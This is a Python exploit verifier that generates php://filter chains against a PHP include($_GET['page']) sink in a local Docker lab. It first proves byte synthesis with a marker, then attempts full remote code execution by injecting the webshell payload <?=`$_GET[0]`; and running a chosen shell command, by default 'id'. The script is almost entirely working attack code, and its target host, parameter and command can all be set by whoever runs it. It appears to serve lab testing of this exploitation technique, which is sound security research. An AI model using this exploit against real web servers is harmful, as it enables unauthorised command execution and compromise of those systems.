#!/usr/bin/env python3
"""End-to-end verifier for the include-sink-ONLY php://filter chain generator.

The generator lands full include-sink RCE via its public (synacktiv) table
(``--emit``); this verifier exercises the from-scratch derivation pipeline
against an ``include($_GET['page'])`` sink: (1) PROOF -- synthesise a
covered-char byte marker via ``php://filter`` and confirm the lab's include()
emits it verbatim; (2) a derived-table RCE attempt that is still partial (41/64
chars) and reports the missing ones. No poison, race, save_path, sid or write.

Bring up the lab:
    FC_PORT=8140 docker compose -f docker-compose.fpm-avenues.yml -p p2s-filterchain --profile filterchain up -d --build
    FC_PORT=8140 python3 -I poc/routes/verify_php_filter_chain.py --port 8140
"""
import argparse
import base64
import itertools
import os
import string
import sys
import urllib.request
from urllib.parse import quote

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import php_filter_chain as pfc  # noqa: E402


def http_get(url, timeout=20):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.read()
    except urllib.error.HTTPError as e:
        return e.read()
    except OSError as e:
        return str(e).encode()


def _covered_marker():
    cov = set(pfc.CONVERSIONS)
    alpha = (string.ascii_letters + string.digits).encode()
    for L in (3, 6):
        for combo in itertools.islice(itertools.product(alpha, repeat=L), 3_000_000):
            p = bytes(combo)
            if set(base64.b64encode(p).decode()) <= cov:
                return p
    return None


def proof(host, port, base, param):
    marker = _covered_marker()
    if not marker:
        print("[-] no covered-char marker found"); return False
    chain = pfc.build_chain(marker)
    url = f"http://{host}:{port}{base}?{param}=" + quote(chain, safe="")
    body = http_get(url)
    ok = marker in body
    print(f"[*] synthesised marker {marker!r} via include-sink-only filter chain "
          f"({len(chain)}B)")
    print(f"[{'+' if ok else '-'}] lab include() emitted the synthesised bytes "
          f"verbatim: {ok}  (resp head {body[:24]!r})")
    return ok


def full_rce(host, port, base, param, cmd, arg):
    payload = f"<?=`$_GET[{arg}]`;".encode()
    try:
        chain = pfc.build_chain(payload)
    except KeyError as e:
        print(f"[!] FULL RCE not yet buildable: {e}")
        print("    (derived table is 41/64; extend via --derive to close the gap)")
        return False
    url = (f"http://{host}:{port}{base}?{param}=" + quote(chain, safe="")
           + f"&{arg}=" + quote(cmd))
    body = http_get(url)
    ok = b"uid=" in body
    print(f"[{'+' if ok else '-'}] FULL RCE include-sink-only: {ok}")
    if ok:
        print(body.decode("latin1", "replace").rstrip())
    return ok


def _cli(argv):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8140)
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--base", default="/index.php")
    ap.add_argument("--param", default="page")
    ap.add_argument("--arg", default="0")
    args = ap.parse_args(argv)
    print("== selftest (seed primitive, needs local php) ==")
    try:
        pfc.selftest(verbose=True)
    except Exception as e:  # noqa: BLE001
        print(f"   (skipped: {e})")
    print("== proof: include-sink-only byte synthesis on the lab ==")
    p = proof(args.host, args.port, args.base, args.param)
    print("== full RCE attempt ==")
    r = full_rce(args.host, args.port, args.base, args.param, args.cmd, args.arg)
    return 0 if (p or r) else 1


if __name__ == "__main__":
    raise SystemExit(_cli(sys.argv[1:]))
